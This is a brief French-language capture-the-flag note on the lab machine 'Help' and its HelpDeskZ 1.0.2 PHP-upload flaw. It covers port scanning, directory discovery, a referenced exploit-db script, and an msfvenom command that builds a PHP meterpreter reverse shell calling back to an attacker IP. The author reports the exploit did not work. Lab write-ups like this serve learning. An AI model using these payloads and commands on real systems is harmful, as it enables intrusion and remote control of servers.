# Help : 10.10.10.121


HelpDeskZ = v1.0.2 permet d'uploader un fichier *.php
On le retrouve avec un chemin dépendant de l'heure de dépos.


$ nmap -sS -sV -oN help.txt -p- 10.10.10.121
=> 80

$ Dirbuster found a directory ‘/support’ on 80
http://10.10.10.121/support/
Webinterface to create support ticket
HelpDeskZ = v1.0.2
CVE :  https://www.exploit-db.com/exploits/40300


Generate php payload
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=6000 R -f raw  > phpshell.php

$ date
$ curl -i http://10.10.10.121
Date: xxxx

On determine le delta de date

$ python 40300.py 'http://10.10.10.121/support/uploads/tickets' php-reverse-shell.php


Pas reussi à le faire fonctionner...